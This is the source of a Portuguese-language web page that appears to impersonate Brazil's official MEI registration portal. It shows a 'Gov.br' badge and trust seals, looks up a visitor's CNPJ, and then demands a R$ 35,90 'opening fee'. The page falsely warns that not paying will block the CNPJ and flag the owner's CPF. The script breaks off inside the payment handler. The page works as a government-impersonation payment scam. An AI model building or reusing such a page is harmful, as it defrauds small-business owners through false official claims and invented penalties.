


<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Abertura de CNPJ MEI - Portal Oficial Brasileiro</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    
    <style>
        :root {
            /* Paleta de cores profissional e institucional */
            --primary-color: #1e40af;
            --primary-hover: #1d4ed8;
            --primary-light: #dbeafe;
            --secondary-color: #64748b;
            --success-color: #059669;
            --success-light: #d1fae5;
            --warning-color: #d97706;
            --warning-light: #fef3c7;
            --error-color: #dc2626;
            --error-light: #fee2e2;
            
            /* Tons de cinza profissionais */
            --gray-50: #f8fafc;
            --gray-100: #f1f5f9;
            --gray-200: #e2e8f0;
            --gray-300: #cbd5e1;
            --gray-400: #94a3b8;
            --gray-500: #64748b;
            --gray-600: #475569;
            --gray-700: #334155;
            --gray-800: #1e293b;
            --gray-900: #0f172a;
            --white: #ffffff;
            
            /* Sombras profissionais */
            --shadow-sm: 0 1px 2px 0 rgb(0 0 0 / 0.05);
            --shadow-md: 0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);
            --shadow-lg: 0 10px 15px -3px rgb(0 0 0 / 0.1), 0 4px 6px -4px rgb(0 0 0 / 0.1);
            --shadow-xl: 0 20px 25px -5px rgb(0 0 0 / 0.1), 0 10px 10px -5px rgb(0 0 0 / 0.04);
            
            /* Bordas e raios */
            --border-radius: 8px;
            --border-radius-lg: 12px;
            --border-radius-xl: 16px;
            
            /* Transições suaves */
            --transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
            --transition-fast: all 0.15s cubic-bezier(0.4, 0, 0.2, 1);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, var(--gray-50) 0%, var(--white) 100%);
            color: var(--gray-800);
            line-height: 1.6;
            min-height: 100vh;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        /* ===== HEADER PROFISSIONAL COM CREDIBILIDADE ===== */
        .header {
            background: var(--white);
            border-bottom: 1px solid var(--gray-200);
            box-shadow: var(--shadow-sm);
            position: sticky;
            top: 0;
            z-index: 100;
        }

        .header-content {
            max-width: 1200px;
            margin: 0 auto;
            padding: 16px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .logo-section {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .logo-icon {
            width: 44px;
            height: 44px;
            background: linear-gradient(135deg, var(--primary-color), var(--primary-hover));
            border-radius: var(--border-radius);
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--white);
            font-size: 20px;
            box-shadow: var(--shadow-md);
        }

        .logo-text {
            display: flex;
            flex-direction: column;
        }

        .logo-title {
            font-size: 18px;
            font-weight: 700;
            color: var(--gray-900);
            line-height: 1.2;
        }

        .logo-subtitle {
            font-size: 12px;
            font-weight: 500;
            color: var(--gray-500);
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .security-indicators {
            display: flex;
            align-items: center;
            gap: 16px;
        }

        .security-badge {
            display: flex;
            align-items: center;
            gap: 6px;
            background: var(--success-light);
            color: var(--success-color);
            padding: 8px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            border: 1px solid var(--success-color);
        }

        .ssl-indicator {
            display: flex;
            align-items: center;
            gap: 4px;
            color: var(--gray-600);
            font-size: 11px;
            font-weight: 500;
        }

        .gov-badge {
            display: flex;
            align-items: center;
            gap: 4px;
            background: var(--primary-light);
            color: var(--primary-color);
            padding: 4px 8px;
            border-radius: 12px;
            font-size: 10px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        /* ===== CONTAINER PRINCIPAL ===== */
        .main-container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 24px 20px;
            display: grid;
            grid-template-columns: 1fr;
            gap: 24px;
        }

        @media (min-width: 1024px) {
            .main-container {
                grid-template-columns: 1fr 380px;
                gap: 32px;
            }
        }

        /* ===== PROGRESSO PROFISSIONAL ===== */
        .progress-section {
            background: var(--white);
            border: 1px solid var(--gray-200);
            border-radius: var(--border-radius-lg);
            padding: 24px;
            box-shadow: var(--shadow-sm);
            margin-bottom: 24px;
        }

        .progress-header {
            text-align: center;
            margin-bottom: 24px;
        }

        .progress-title {
            font-size: 16px;
            font-weight: 600;
            color: var(--gray-900);
            margin-bottom: 4px;
        }

        .progress-subtitle {
            font-size: 13px;
            color: var(--gray-600);
        }

        .progress-steps {
            display: flex;
            justify-content: space-between;
            position: relative;
            margin-bottom: 16px;
        }

        .progress-line {
            position: absolute;
            top: 20px;
            left: 20px;
            right: 20px;
            height: 2px;
            background: var(--gray-200);
            z-index: 1;
        }

        .progress-line-active {
            position: absolute;
            top: 20px;
            left: 20px;
            height: 2px;
            background: linear-gradient(90deg, var(--primary-color), var(--primary-hover));
            z-index: 2;
            transition: width 0.5s ease;
            width: 0%;
            border-radius: 1px;
        }

        .step {
            display: flex;
            flex-direction: column;
            align-items: center;
            position: relative;
            z-index: 3;
            flex: 1;
        }

        .step-circle {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: var(--white);
            border: 2px solid var(--gray-300);
            color: var(--gray-500);
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 600;
            font-size: 14px;
            transition: var(--transition);
            margin-bottom: 8px;
        }

        .step.active .step-circle {
            background: var(--primary-color);
            border-color: var(--primary-color);
            color: var(--white);
            box-shadow: 0 0 0 4px var(--primary-light);
            transform: scale(1.05);
        }

        .step.completed .step-circle {
            background: var(--success-color);
            border-color: var(--success-color);
            color: var(--white);
            transform: scale(1.05);
        }

        .step-label {
            font-size: 12px;
            font-weight: 500;
            color: var(--gray-600);
            text-align: center;
            max-width: 80px;
        }

        .step.active .step-label {
            color: var(--primary-color);
            font-weight: 600;
        }

        .step.completed .step-label {
            color: var(--success-color);
        }

        /* ===== FORMULÁRIO PRINCIPAL ===== */
        .form-container {
            background: var(--white);
            border: 1px solid var(--gray-200);
            border-radius: var(--border-radius-lg);
            box-shadow: var(--shadow-sm);
            overflow: hidden;
        }

        .form-header {
            background: linear-gradient(135deg, var(--gray-50) 0%, var(--white) 100%);
            border-bottom: 1px solid var(--gray-200);
            padding: 24px 32px;
        }

        .form-title {
            font-size: 24px;
            font-weight: 700;
            color: var(--gray-900);
            margin-bottom: 6px;
        }

        .form-subtitle {
            font-size: 15px;
            color: var(--gray-600);
            line-height: 1.5;
        }

        .form-content {
            padding: 32px;
        }

        .step-content {
            display: none;
        }

        .step-content.active {
            display: block;
            animation: fadeInUp 0.3s ease-out;
        }

        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: var(--gray-800);
            margin-bottom: 8px;
        }

        .form-label.required::after {
            content: '*';
            color: var(--error-color);
            margin-left: 4px;
        }

        .form-input {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid var(--gray-300);
            border-radius: var(--border-radius);
            font-size: 15px;
            color: var(--gray-900);
            background: var(--white);
            transition: var(--transition-fast);
        }

        .form-input:focus {
            outline: none;
            border-color: var(--primary-color);
            box-shadow: 0 0 0 3px var(--primary-light);
        }

        .form-input.error {
            border-color: var(--error-color);
            background: var(--error-light);
        }

        .form-input.success {
            border-color: var(--success-color);
            background: var(--success-light);
        }

        .error-message {
            display: none;
            font-size: 12px;
            color: var(--error-color);
            margin-top: 6px;
        }

        .error-message.show {
            display: block;
        }

        /* ===== SEÇÃO: Comunicado sobre Taxa de Abertura ===== */
        .fee-notice-section {
            background: var(--primary-light);
            border: 1px solid var(--primary-color);
            border-radius: var(--border-radius-lg);
            padding: 24px;
            margin-top: 24px;
        }

        .fee-notice-header {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 16px;
        }

        .fee-notice-icon {
            width: 24px;
            height: 24px;
            color: var(--primary-color);
            font-size: 20px;
        }

        .fee-notice-title {
            font-size: 18px;
            font-weight: 700;
            color: var(--primary-color);
            margin: 0;
        }

        .fee-notice-content {
            color: var(--gray-700);
            line-height: 1.6;
        }

        .fee-notice-text {
            font-size: 15px;
            margin-bottom: 16px;
        }

        .fee-highlight-box {
            background: var(--white);
            border: 1px solid var(--primary-color);
            border-radius: var(--border-radius);
            padding: 16px;
            margin: 16px 0;
            text-align: center;
        }

        .fee-amount {
            font-size: 28px;
            font-weight: 700;
            color: var(--primary-color);
            margin-bottom: 4px;
        }

        .fee-description {
            font-size: 14px;
            color: var(--gray-600);
            font-weight: 500;
        }

        .fee-benefits-list {
            list-style: none;
            padding: 0;
            margin: 16px 0 0 0;
        }

        .fee-benefits-list li {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 8px;
            font-size: 14px;
            color: var(--gray-700);
        }

        .fee-benefits-list li::before {
            content: '✓';
            color: var(--success-color);
            font-weight: bold;
            font-size: 16px;
        }

        /* ===== LOADING INDICATOR ===== */
        .loading-indicator {
            display: none;
            align-items: center;
            gap: 8px;
            margin-top: 8px;
            color: var(--gray-600);
            font-size: 13px;
        }

        .loading-indicator.show {
            display: flex;
            animation: fadeIn 0.3s ease-out;
        }

        .spinner {
            width: 16px;
            height: 16px;
            border: 2px solid var(--gray-300);
            border-top: 2px solid var(--primary-color);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* ===== BOTÕES PROFISSIONAIS ===== */
        .button-group {
            display: flex;
            gap: 12px;
            margin-top: 32px;
        }

        .btn {
            padding: 12px 24px;
            border: none;
            border-radius: var(--border-radius);
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: var(--transition);
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            min-width: 140px;
        }

        .btn-primary {
            background: linear-gradient(135deg, var(--primary-color), var(--primary-hover));
            color: var(--white);
            box-shadow: var(--shadow-md);
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: var(--shadow-lg);
        }

        .btn-primary:active {
            transform: translateY(0);
        }

        .btn-secondary {
            background: var(--gray-100);
            color: var(--gray-700);
            border: 1px solid var(--gray-300);
        }

        .btn-secondary:hover {
            background: var(--gray-200);
        }

        .btn-loading {
            opacity: 0.7;
            pointer-events: none;
        }

        /* ===== CHECKBOX ===== */
        .checkbox-group {
            display: flex;
            align-items: flex-start;
            gap: 12px;
            margin-bottom: 16px;
        }

        .checkbox-input {
            width: 20px;
            height: 20px;
            margin-top: 2px;
            cursor: pointer;
            accent-color: var(--primary-color);
        }

        .checkbox-label {
            font-size: 14px;
            color: var(--gray-700);
            line-height: 1.5;
            cursor: pointer;
        }

        .checkbox-label strong {
            color: var(--gray-900);
            font-weight: 600;
        }

        /* ===== DECLARATION SECTION ===== */
        .declaration-section {
            background: var(--gray-50);
            border: 1px solid var(--gray-200);
            border-radius: var(--border-radius-lg);
            padding: 24px;
            margin: 24px 0;
        }

        .declaration-title {
            font-size: 16px;
            font-weight: 600;
            color: var(--gray-900);
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .declaration-text {
            font-size: 14px;
            color: var(--gray-700);
            line-height: 1.6;
            margin-bottom: 20px;
        }

        /* ===== SIDEBAR ===== */
        .sidebar {
            display: none;
        }

        @media (min-width: 1024px) {
            .sidebar {
                display: flex;
                flex-direction: column;
                gap: 20px;
            }
        }

        .summary-card {
            background: var(--white);
            border: 1px solid var(--gray-200);
            border-radius: var(--border-radius-lg);
            padding: 20px;
            box-shadow: var(--shadow-sm);
        }

        .summary-title {
            font-size: 16px;
            font-weight: 600;
            color: var(--gray-900);
            margin-bottom: 16px;
        }

        .price-display {
            background: linear-gradient(135deg, var(--primary-light) 0%, rgba(30, 64, 175, 0.05) 100%);
            border-radius: var(--border-radius);
            padding: 16px;
            text-align: center;
        }

        .price-label {
            font-size: 12px;
            color: var(--gray-600);
            font-weight: 500;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 4px;
        }

        .price-value {
            font-size: 24px;
            font-weight: 700;
            color: var(--primary-color);
        }

        .trust-section {
            background: var(--white);
            border: 1px solid var(--gray-200);
            border-radius: var(--border-radius-lg);
            padding: 20px;
            box-shadow: var(--shadow-sm);
        }

        .trust-title {
            font-size: 16px;
            font-weight: 600;
            color: var(--gray-900);
            margin-bottom: 16px;
        }

        .trust-item {
            display: flex;
            gap: 12px;
            margin-bottom: 12px;
            font-size: 13px;
            color: var(--gray-700);
        }

        .trust-icon {
            width: 20px;
            height: 20px;
            background: var(--success-light);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--success-color);
            font-size: 12px;
            flex-shrink: 0;
            margin-top: 2px;
        }

        .trust-text {
            line-height: 1.4;
        }

        /* ===== LOADING OVERLAY ===== */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(15, 23, 42, 0.8);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }

        .loading-content {
            background: var(--white);
            padding: 32px;
            border-radius: var(--border-radius-lg);
            text-align: center;
            box-shadow: var(--shadow-xl);
        }

        .loading-spinner {
            width: 40px;
            height: 40px;
            border: 3px solid var(--gray-200);
            border-top: 3px solid var(--primary-color);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 16px;
        }

        .loading-text {
            font-size: 16px;
            font-weight: 600;
            color: var(--gray-900);
        }

        /* ===== SUCCESS NOTIFICATION ===== */
        .success-notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background: var(--success-color);
            color: var(--white);
            padding: 16px 20px;
            border-radius: var(--border-radius);
            box-shadow: var(--shadow-lg);
            display: none;
            z-index: 999;
            animation: slideIn 0.3s ease-out;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateX(100px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }

        /* ===== CNPJ INFO DISPLAY ===== */
        .cnpj-info-display {
            background: var(--success-light);
            border: 1px solid var(--success-color);
            border-radius: var(--border-radius-lg);
            padding: 20px;
            margin: 24px 0;
        }

        .cnpj-info-display h3 {
            font-size: 16px;
            font-weight: 600;
            color: var(--success-color);
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .cnpj-info-grid {
            display: grid;
            grid-template-columns: 1fr;
            gap: 10px 20px;
        }

        @media (min-width: 768px) {
            .cnpj-info-grid {
                grid-template-columns: repeat(2, 1fr);
            }
        }

        .cnpj-info-item {
            display: flex;
            flex-direction: column;
            font-size: 14px;
        }

        .cnpj-info-label {
            font-weight: 600;
            color: var(--gray-800);
            margin-bottom: 2px;
        }

        .cnpj-info-value {
            color: var(--gray-700);
        }

        /* ===== WAITING PAYMENT (SUBTLE) ===== */
        .waiting-payment-subtle {
            display: none;
            align-items: center;
            gap: 12px;
            padding: 16px;
            background: var(--warning-light);
            border-radius: var(--border-radius);
            border: 1px solid var(--warning-color);
            margin-top: 24px;
        }

        .waiting-payment-subtle.show {
            display: flex;
            animation: fadeIn 0.3s ease-out;
        }

        .spinner-small {
            width: 20px;
            height: 20px;
            border: 2px solid var(--warning-color);
            border-top: 2px solid transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        .waiting-payment-text {
            font-size: 14px;
            font-weight: 500;
            color: var(--warning-color);
        }


        /* ===== INFO SECTION (PAYMENT PAGE) ===== */
        .info-section {
            background: var(--gray-50);
            border: 1px solid var(--gray-200);
            border-radius: var(--border-radius-lg);
            margin-bottom: 24px;
        }

        .info-section-header {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 16px 20px;
            border-bottom: 1px solid var(--gray-200);
        }

        .info-section-icon {
            color: var(--primary-color);
            font-size: 18px;
        }

        .info-section-title {
            font-size: 16px;
            font-weight: 600;
            color: var(--gray-900);
            margin: 0;
        }

        .info-section-content {
            padding: 20px;
        }

    </style>
</head>
<body>
    <header class="header">
        <div class="header-content">
            <div class="logo-section">
                <div class="logo-icon">
                    <i class="fas fa-building"></i>
                </div>
                <div class="logo-text">
                    <span class="logo-title">Portal MEI</span>
                    <span class="logo-subtitle">Online</span>
                </div>
            </div>
            <div class="security-indicators">
                <div class="security-badge">
                    <i class="fas fa-shield-alt"></i>
                    <span>Seguro</span>
                </div>
                <div class="">
                    <i class=""></i>
                    <span></span>
                </div>
                <div class="gov-badge">
                    <i class="fas fa-check-circle"></i>
                    <span>Gov.br</span>
                </div>
            </div>
        </div>
    </header>

    <div class="main-container">
        <main>
            <!-- Seção de Progresso -->
            <div class="progress-section">
                <div class="progress-header">
                    <h2 class="progress-title">Processo de formalização do MEI</h2>
                    <p class="progress-subtitle">Processo rápido, seguro e 100% online.</p>
                </div>
                <div class="progress-steps">
                    <div class="progress-line"></div>
                    <div class="progress-line-active" id="progressLineActive"></div>
                    
                    <div class="step active" data-step="1">
                        <div class="step-circle">1</div>
                        <span class="step-label">Inicial</span>
                    </div>
                    <div class="step" data-step="2">
                        <div class="step-circle">2</div>
                        <span class="step-label">Confirmação</span>
                    </div>
                    <div class="step" data-step="3">
                        <div class="step-circle">3</div>
                        <span class="step-label">Finalização</span>
                    </div>
                </div>
            </div>

            <!-- Container do Formulário -->
            <div class="form-container">
                <!-- Etapa 1: Dados do CNPJ -->
                <div class="step-content active" id="step1">
                    <div class="form-header">
                        <h1 class="form-title">Validação do CNPJ</h1>
                        <p class="form-subtitle">Informe o CNPJ para iniciarmos a consulta e validação dos seus dados.</p>
                    </div>
                    
                    <div class="form-content">
                        <form id="cnpjForm">
                            <div class="form-group">
                                <label class="form-label required" for="cnpj">CNPJ</label>
                                <div style="position: relative;">
                                    <input type="text" id="cnpj" name="cnpj" class="form-input" maxlength="18" placeholder="00.000.000/0000-00" inputmode="numeric">
                                </div>
                                <div class="error-message" id="cnpjError">Digite um CNPJ válido</div>
                                <div class="loading-indicator" id="cnpjLoadingIndicator">
                                    <div class="spinner"></div>
                                    <span>Buscando dados do CNPJ...</span>
                                </div>
                            </div>

                            <!-- Seção de Informações do CNPJ -->
                            <div class="cnpj-info-display" id="cnpjInfoDisplay" style="display: none;">
                                <h3>
                                    <i class="fas fa-check-circle"></i>
                                    Dados da Empresa
                                </h3>
                                <div class="cnpj-info-grid" id="cnpjInfoGrid">
                                    <!-- Dados serão preenchidos dinamicamente -->
                                </div>
                            </div>

                            <!-- Mensagem de Aguardando Pagamento (Sutil e Profissional) -->
                            <div class="waiting-payment-subtle" id="waitingPayment" style="display: none;">
                                <div class="spinner-small"></div>
                                <div class="waiting-payment-text">Aguardando pagamento da taxa de abertura...</div>
                            </div>

                            <div class="button-group">
                                <button type="button" id="btn-prosseguir" class="btn btn-primary">
                                    <i class="fas fa-arrow-right"></i>
                                    Prosseguir
                                </button>
                            </div>
                        </form>
                    </div>
                </div>

                <!-- Etapa 2: Pagamento -->
                <div class="step-content" id="step2">
                    <div class="form-header">
                        <h1 class="form-title">Confirmação e Finalização</h1>
                        <p class="form-subtitle">Revise seus dados e finalize o processo de abertura do MEI</p>
                    </div>
                    
                    <div class="form-content">
                        <!-- Seção de Informações do CNPJ (Resumo) -->
                        <div class="info-section">
                            <div class="info-section-header">
                                <i class="fas fa-building info-section-icon"></i>
                                <h3 class="info-section-title">Dados da Empresa</h3>
                            </div>
                            <div class="info-section-content">
                                <div class="cnpj-info-grid" id="paymentCnpjInfoGrid">
                                    <!-- Dados serão preenchidos dinamicamente -->
                                </div>
                            </div>
                        </div>

                        <!-- SEÇÃO: Comunicado sobre Taxa de Abertura -->
                        <div class="fee-notice-section">
                            <div class="fee-notice-header">
                                <i class="fas fa-info-circle fee-notice-icon"></i>
                                <h3 class="fee-notice-title">Informações sobre Taxa de Abertura</h3>
                            </div>
                            <div class="fee-notice-content">
                                <p class="fee-notice-text">
                                    Para finalizar o processo de abertura do seu MEI, é necessário o pagamento da taxa de processamento e formalização. 
                                </p>
                                
                                <div class="fee-highlight-box">
                                    <div class="fee-amount">R$ 35,90</div>
                                    <div class="fee-description">Taxa única de abertura e formalização</div>
                                </div>

                                <p class="fee-notice-text">
                                    <strong>O que está incluído na taxa:</strong>
                                </p>
                                
                                <ul class="fee-benefits-list">
                                    <li>Processamento completo da documentação</li>
                                    <li>Registro oficial no Portal do Empreendedor</li>
                                    <li>Emissão do Certificado da Condição de MEI (CCMEI)</li>
                                    <li>Inscrição Municipal e Estadual (quando aplicável)</li>
                                </ul>

                                <p class="fee-notice-text">
                                    <strong>Importante:</strong> Esta é uma taxa única e não há custos adicionais. 
                                    O não pagamento da taxa acarretará no bloqueio do CNPJ e negativação do CPF do titular.
                                </p>
                            </div>
                        </div>

                        <div class="declaration-section">
                            <h3 class="declaration-title">
                                <i class="fas fa-exclamation-triangle"></i>
                                Declaração e Termos
                            </h3>
                            <p class="declaration-text">
                                Ao prosseguir, você declara que leu e aceita os Termos de Uso e a Política de Privacidade, 
                                confirma que as informações fornecidas são verdadeiras e autoriza o processamento dos seus 
                                dados conforme a Lei Geral de Proteção de Dados (LGPD).
                            </p>
                            
                            <div class="checkbox-group">
                                <input type="checkbox" id="termsAccept" name="termsAccept" class="checkbox-input" required>
                                <label for="termsAccept" class="checkbox-label">
                                    Declaro que li e aceito os <strong>Termos de Uso</strong> e a <strong>Política de Privacidade</strong>
                                </label>
                            </div>
                            
                            <div class="checkbox-group">
                                <input type="checkbox" id="dataAccuracy" name="dataAccuracy" class="checkbox-input" required>
                                <label for="dataAccuracy" class="checkbox-label">
                                    Confirmo que todas as informações fornecidas são <strong>verdadeiras e legítimas</strong>
                                </label>
                            </div>
                        </div>

                        <form id="confirmationForm">
                            <div class="button-group">
                                <button type="button" class="btn btn-secondary" onclick="goToStep(1)">
                                    <i class="fas fa-arrow-left"></i>
                                    Voltar
                                </button>
                                <button type="submit" class="btn btn-primary">
                                    <i class="fas fa-credit-card"></i>
                                    Pagar Taxa R$ 35,90
                                </button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </main>

        <!-- Sidebar -->
        <aside class="sidebar">
            <div class="summary-card">
                <h3 class="summary-title">Resumo do Processo</h3>
                
                <div class="price-display">
                    <div class="price-label">Taxa de Abertura MEI</div>
                    <div class="price-value">R$ 35,90</div>
                </div>
            </div>

            <div class="trust-section">
                <h3 class="trust-title">Garantias e Benefícios</h3>
                
                <div class="trust-item">
                    <div class="trust-icon">
                        <i class="fas fa-check"></i>
                    </div>
                    <div class="trust-text">Processo 100% seguro e certificado</div>
                </div>
                
                <div class="trust-item">
                    <div class="trust-icon">
                        <i class="fas fa-check"></i>
                    </div>
                    <div class="trust-text">Abertura em até 48 horas úteis</div>
                </div>
                
                <div class="trust-item">
                    <div class="trust-icon">
                        <i class="fas fa-check"></i>
                    </div>
                    <div class="trust-text">Suporte especializado incluído</div>
                </div>
                
                <div class="trust-item">
                    <div class="trust-icon">
                        <i class="fas fa-check"></i>
                    </div>
                    <div class="trust-text">Documentos em formato digital</div>
                </div>

                <div class="trust-item">
                    <div class="trust-icon">
                        <i class="fas fa-check"></i>
                    </div>
                    <div class="trust-text">Conformidade com legislação vigente</div>
                </div>
                
                <div class="trust-item">
                    <div class="trust-icon">
                        <i class="fas fa-check"></i>
                    </div>
                    <div class="trust-text">Garantia de satisfação</div>
                </div>
            </div>
        </aside>
    </div>

    <!-- Loading Overlay -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-content">
            <div class="loading-spinner"></div>
            <div class="loading-text">Processando solicitação...</div>
        </div>
    </div>

    <!-- Notificação de Sucesso -->
    <div class="success-notification" id="successNotification">
        ✅ Dados validados com sucesso!
    </div>

    <script>
        // ===== VARIÁVEIS GLOBAIS =====
        let currentStep = 1;
        let cnpjData = null;
        let isProcessing = false;

        // ===== UTILITÁRIOS =====
        function debounce(func, delay) {
            let timeoutId;
            return function (...args) {
                clearTimeout(timeoutId);
                timeoutId = setTimeout(() => func.apply(this, args), delay);
            };
        }

        function showSuccessNotification(message) {
            const notification = document.getElementById('successNotification');
            if (notification) {
                notification.textContent = message;
                notification.style.display = 'block';
                setTimeout(() => {
                    notification.style.display = 'none';
                }, 3000);
            }
        }

        // ===== NAVEGAÇÃO ENTRE ETAPAS =====
        function goToStep(stepNumber) {
            const steps = document.querySelectorAll('.step-content');
            const progressSteps = document.querySelectorAll('.step');
            const progressLineActive = document.getElementById('progressLineActive');

            steps.forEach((step, index) => {
                step.classList.remove('active');
                if (index + 1 === stepNumber) {
                    step.classList.add('active');
                }
            });

            progressSteps.forEach((step, index) => {
                const stepNumber_attr = step.getAttribute('data-step');
                step.classList.remove('active', 'completed');
                
                if (parseInt(stepNumber_attr) === stepNumber) {
                    step.classList.add('active');
                } else if (parseInt(stepNumber_attr) < stepNumber) {
                    step.classList.add('completed');
                }
            });

            const progressWidth = ((stepNumber - 1) / (progressSteps.length - 1)) * 100;
            if (progressLineActive) {
                progressLineActive.style.width = `${progressWidth}%`;
            }

            currentStep = stepNumber;
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }

        // ===== MÁSCARA DE CNPJ =====
        function applyCNPJMask(value) {
            return value
                .replace(/\D/g, '')
                .replace(/^(\d{2})(\d)/, '$1.$2')
                .replace(/^(\d{2})\.(\d{3})(\d)/, '$1.$2.$3')
                .replace(/\.(\d{3})(\d)/, '.$1/$2')
                .replace(/(\d{4})(\d)/, '$1-$2');
        }

        // ===== BUSCA DE CNPJ =====
        async function handleCNPJLookup() {
            const cnpjInput = document.getElementById('cnpj');
            const cnpj = cnpjInput.value.replace(/\D/g, '');
            const loadingIndicator = document.getElementById('cnpjLoadingIndicator');
            const cnpjInfoDisplay = document.getElementById('cnpjInfoDisplay');
            const waitingPayment = document.getElementById('waitingPayment');
            const errorEl = document.getElementById('cnpjError');

            if (cnpj.length !== 14) {
                cnpjInfoDisplay.style.display = 'none';
                waitingPayment.style.display = 'none';
                cnpjInput.classList.remove('success');
                if (errorEl) errorEl.classList.remove('show');
                return;
            }

            if (isProcessing) return;
            isProcessing = true;

            if (loadingIndicator) {
                loadingIndicator.classList.add('show');
            }

            try {
                const response = await fetch(`https://brasilapi.com.br/api/cnpj/v1/${cnpj}`, {
                    signal: AbortSignal.timeout(5000)
                });

                const data = await response.json();

                await new Promise(resolve => setTimeout(resolve, 400));

                if (!response.ok || data.message === 'CNPJ inválido' || data.type === 'service_error') {
                    throw new Error(data.message || 'CNPJ não encontrado ou inválido');
                }

                // A BrasilAPI retorna os dados diretamente no corpo da resposta
                cnpjData = data;
                displayCNPJInfo(data);
                cnpjInput.classList.add('success');
                cnpjInput.classList.remove('error');
                if (errorEl) errorEl.classList.remove('show');
                cnpjInfoDisplay.style.display = 'block';
                waitingPayment.style.display = 'block';
                showSuccessNotification('CNPJ encontrado com sucesso!');

                

                

                

                
            } catch (error) {
                console.error('Erro ao buscar CNPJ:', error);
                showCNPJError('Erro ao buscar CNPJ. Verifique se o CNPJ está correto ou tente novamente mais tarde.');
            } finally {
                if (loadingIndicator) {
                    loadingIndicator.classList.remove('show');
                }
                isProcessing = false;
            }
        }

        function displayCNPJInfo(data) {
            const cnpjInfoGrid = document.getElementById('cnpjInfoGrid');
            const paymentCnpjInfoGrid = document.getElementById('paymentCnpjInfoGrid');

const infoItems = [
				                { label: 'CNPJ', value: data.cnpj },
				                { label: 'Situação Cadastral', value: data.descricao_situacao_cadastral || '-' },
				                { label: 'Data da Situação', value: data.data_situacao_cadastral || '-' },
				                { label: 'Razão Social', value: data.razao_social },
				                { label: 'Nome Fantasia', value: data.nome_fantasia || '-' },
				                { label: 'Natureza Jurídica', value: data.descricao_natureza_juridica || '-' },
				                { label: 'Porte', value: data.porte || '-' },
				                { label: 'Data de Abertura', value: data.data_inicio_atividade || '-' },
				                { label: 'Atividade Principal', value: data.cnae_fiscal_principal?.descricao || '-' },
				                { label: 'Endereço', value: `${data.logradouro || ''}, ${data.numero || ''} ${data.complemento || ''} - ${data.bairro || ''}, ${data.municipio || ''}/${data.uf || ''} - CEP: ${data.cep || ''}`.trim() },
				                { label: 'Telefone', value: `${data.ddd_telefone_1 || ''} ${data.telefone_1 || ''}`.trim() || '-' },
				                { label: 'E-mail', value: data.email || '-' }
				            ];

            const htmlContent = infoItems.map(item => `
                <div class="cnpj-info-item">
                    <span class="cnpj-info-label">${item.label}</span>
                    <span class="cnpj-info-value">${item.value}</span>
                </div>
            `).join('');

            if (cnpjInfoGrid) cnpjInfoGrid.innerHTML = htmlContent;
            if (paymentCnpjInfoGrid) paymentCnpjInfoGrid.innerHTML = htmlContent;
        }

        function showCNPJError(message) {
            const cnpjInput = document.getElementById('cnpj');
            const errorEl = document.getElementById('cnpjError');
            const cnpjInfoDisplay = document.getElementById('cnpjInfoDisplay');
            const waitingPayment = document.getElementById('waitingPayment');

            cnpjInput.classList.add('error');
            cnpjInput.classList.remove('success');
            if (errorEl) {
                errorEl.textContent = message;
                errorEl.classList.add('show');
            }
            cnpjInfoDisplay.style.display = 'none';
            waitingPayment.style.display = 'none';
        }

        // ===== HANDLERS DE FORMULÁRIO =====
        function handleCNPJFormSubmit(e) {
            e.preventDefault();
            // A busca agora é acionada ao preencher o campo ou clicar em Prosseguir
        }

        async function handleConfirmationSubmit(e) {
            e.preventDefault();

            const checkboxes = e.target.querySelectorAll('input[type="checkbox"][required]');
            let allChecked = true;

